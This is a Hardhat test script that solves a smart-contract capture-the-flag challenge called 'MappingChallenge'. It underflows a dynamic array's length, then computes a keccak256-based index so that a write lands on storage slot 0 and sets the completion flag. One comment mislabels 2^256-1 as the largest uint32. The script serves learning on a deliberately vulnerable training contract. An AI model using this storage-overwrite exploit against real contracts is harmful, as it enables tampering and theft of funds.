import { ethers } from "hardhat";
import { expect } from "chai";
import { utils } from "ethers";


describe("mapping", function() {
    it("should solve the mapping challenge", async function() {
        this.timeout(0);

        const TARGET_ADDR = "0x331FeE7dde644Ed4eeB7d6F571DD9a9Fcf8F203b";

        // print balance
        let accounts = await ethers.getSigners();
        let eoa = accounts[0];
        let balance = await eoa.getBalance();
        console.log(ethers.utils.formatEther(balance));
        
        // attach to target contract
        const factory = await ethers.getContractFactory("MappingChallenge");
        const targetCont = factory.attach(TARGET_ADDR);

        // contract adds 1 and it becomas 2^256 - 1 (biggest uint32)
        let underflow = ethers.BigNumber.from(2).pow(256).sub(2);

        // call set to underflow array index
        let tx = await targetCont.set(underflow, 5);
        await tx.wait();
        console.log(tx);

        // calculate map start
        let mapStart = ethers.BigNumber.from(
            utils.keccak256('0x0000000000000000000000000000000000000000000000000000000000000001')
        ); 
        console.log(mapStart);

        // calculate key to point storage at 0
        let isCompleteAddr = ethers.BigNumber.from(2).pow(256).sub(mapStart);
        console.log(isCompleteAddr);

        // write 1 at storage index 0
        tx = await targetCont.set(isCompleteAddr, 1);
        await tx.wait();
        console.log(tx);

        let isComplete = await targetCont.isComplete(); 
        expect(isComplete).to.be.true;
    });
});